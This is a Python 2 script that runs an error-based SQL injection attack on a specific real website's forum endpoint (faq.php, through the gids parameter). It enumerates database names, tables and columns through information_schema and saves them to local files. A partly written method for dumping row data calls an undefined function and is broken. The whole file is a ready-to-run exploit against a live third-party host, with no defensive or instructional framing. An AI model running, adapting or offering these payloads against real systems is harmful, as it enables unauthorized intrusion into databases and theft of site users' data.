#encoding:utf-8

import os
import re
import requests
import urllib
import urllib2

class Crash(object):

    def __init__(self):

        self.url = 'http://en.huayugame.com/bbs/faq.php?action=grouppermission&searchgroupid=3'
        self.headers = {'User-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'}
        self.pattern = re.compile('\^\^(.*)\^\^')


    def get_data(self, post_data):

        request = urllib2.Request(self.url, headers=self.headers, data=post_data)
        response = urllib2.urlopen(request).read()
        result_search = self.pattern.search(response)

        if result_search:
            return result_search.groups()[0].strip()


    def crash_databases_name(self):

        data = "gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(0x5e5e, (select distinct table_schema from information_schema.columns limit {index},1), 0x5e5e, floor(rand(0)*2))x from information_schema.tables group by x)a)#"

        fp = open('databases.txt', 'w')
        databases = []

        for i in xrange(0, 1000):

            post_data = data.replace('{index}', str(i))
            database = self.get_data(post_data)

            if not database:
                break

            if database not in databases:
                databases.append(database)
                fp.write(database+'\n')
                print i, database

        print 'get all databases successfully...'
        fp.close()


    def crash_tables_name(self):

        data = "gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat((select concat(0x5e5e,table_name,0x5e5e) from information_schema.columns where table_schema=0x{table_name} limit {index},1), floor(rand(0)*2))x from information_schema.tables group by x)a)#"

        fp = open('tables.txt', 'w')
        for database in open('databases.txt', 'r'):

            tables = []
            repeat = 0
            database = database.strip()
            trans_data = data.replace('{table_name}', database.encode('hex'))

            print '-' * 100
            print 'handling database: ', database

            for i in xrange(1, 1000):

                post_data = trans_data.replace('{index}', str(i))
                table = self.get_data(post_data)

                if table not in tables and table:
                    print '[*]', database+'.'+table
                    tables.append(table)
                if not table:
                    break

            for table in tables:
                fp.write(table+'\n')
        fp.close()
        print 'get all tables successfully...'


    def crash_columns_name(self):

        data = "gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(0x5e5e, (select column_name from information_schema.columns where table_name=0x{table_name} limit {index},1), 0x5e5e, floor(rand(0)*2))x from information_schema.tables group by x)a)#"
        for database_table in open('tables.txt', 'r'):
        # for table in xrange(10):

            # database = database_table.split('.')[0]
            print database_table,
            table = database_table.strip().split('.')[1]

            # table = 'users'

            table = table.strip()
            print '[*]handling table', table
            trans_data = data.replace('{table_name}', table.encode('hex'))
            columns = []
            prepare = ''
            # print trans_data

            for i in xrange(1, 20):
                post_data = trans_data.replace('{index}', str(i))
                column = self.get_data(post_data).strip()

                if column not in columns:
                    columns.append(column)
                    prepare += '0x5e5e,' + column
                    # print column

                if not column:
                    break

            # print 'columns', columns
            for i in columns:
                print i + '',
            print '\n'
            raw_input('wait....')

            # self.crash_data(database_table, prepare)


    def crash_data(self, database_table, data):

        data = "gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(0x5e5e, (select concat({columns}) from {database_table} limit {index},1), 0x5e5e, floor(rand(0)*2))x from information_schema.tables group by x)a)#"
        data = data.replace('{database_table}', database_table).replace('{columns}', data)

        i = 1
        while True:
            post_data = data.replace('{index}', str(i))
            all_data = self.get_post(post_data)




def main():

    crash = Crash()
    # crash.crash_databases_name()
    crash.crash_tables_name()
    # crash.crash_columns_name()

if __name__ == '__main__':
    os.system('clear')

    main()
